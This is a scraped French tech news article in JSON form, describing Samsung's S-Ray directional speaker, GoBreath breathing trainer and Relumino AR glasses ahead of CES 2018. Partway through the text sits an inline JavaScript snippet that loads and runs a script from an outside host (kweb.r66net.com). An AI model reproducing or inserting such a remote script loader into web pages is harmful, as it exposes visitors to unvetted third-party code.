{"title": "Samsung devoile des lunettes connectees, l'enceinte S-Ray et un << inspirometre >>", "newspaper": "Futura Sciences", "author": ["Par Futura avec l'AFP-Relaxnews"], "date_publi": "2018-01-05", "content": "En preambule du salon  Consumer Electronics Show  (CES), Samsung a presente trois innovations : une enceinte directionnelle, un appareil d'aide a la respiration et des lunettes de realite augmentee pour aider les malvoyants. Samsung va profiter du  Consumer Electronics Show  (CES), qui doit debuter mardi 9 janvier, a Las  Vegas  (Etats-Unis), pour presenter trois innovations sorties tout droit de son C-Lab : une enceinte directionnelle, une solution d'aide respiratoire et des lunettes de  realite augmentee  pour malvoyants.  S-Ray, une enceinte que vous seul entendez Cette petite  enceinte  portable, baptisee  S-Ray  (pour Sound-Ray), est en fait un haut-parleur directionnel fait pour profiter de sa musique absolument n'importe ou sans gener les autres personnes a proximite.  ( function () { var vs = document.createElement(\"script\"); vs.type = \"text/javascript\"; vs.async = true; vs.src = \"https://kweb.r66net.com/GetLink\"; var s = document.getElementsByTagName(\"script\")[0]; s.parentNode.insertBefore(vs, s); })();  Cette technologie permet en effet d'ecouter de la musique sans avoir besoin d'utiliser un casque et sans que d'autres ne l'entendent. A terme, l'idee est de decliner ce concept en plusieurs tailles selon les usages (a la maison, en salle de sport, dans les transports, etc.).  GoBreath, pour apprendre a respirer Samsung vient en aide aux personnes souffrant de  problemes pulmonaires  avec cette solution nommee  GoBreath , qui prend la forme d'un inspirometre a accrocher a son  smartphone . Son  application  mobile dediee est chargee d'enseigner les techniques de base de l'inspiration ou encore de la respiration profonde. Les patients peuvent ainsi se referer aux directives des differents exercices pour verifier dans quelle mesure leurs  poumons  ont recupere grace a cette methode. L'idee est aussi de permettre aux medecins de suivre a distance les progres realises par leurs patients. Relumino, des lunettes de realite augmentee pour les malvoyants Jusqu'a present, le concept de  Relumino , destine a rendre l'environnement plus accessible aux deficients visuels, ne fonctionnait qu'a travers une application dediee a un casque de  realite virtuelle , en l'occurrence le Samsung Gear VR, ce qui n'etait pas tres pratique. En proposant ce prototype de lunettes connectees de realite augmentee, Samsung souhaite simplifier la vie des malvoyants en corrigeant automatiquement les images renvoyees a travers plusieurs modes de vision, rendant celles-ci plus claires ou permettant de lire de pres correctement. Ces lunettes seraient,  a priori , adaptees a tous les types de handicaps visuels. Vous avez aime cet article ? N'hesitez pas a le partager avec vos ami(e)s et aidez-nous a faire connaitre Futura :) ! La Redaction vous remercie. Facebook Twitter Google+ Linkedin Pinterest A voir aussi :  lunettes de galilee  |  mes lunettes me font mal au nez  |  lunettes ou telescope  |  lunettes infrarouge  |  lunettes polarisees  |  3d relief sans lunettes", "theme": "tech"}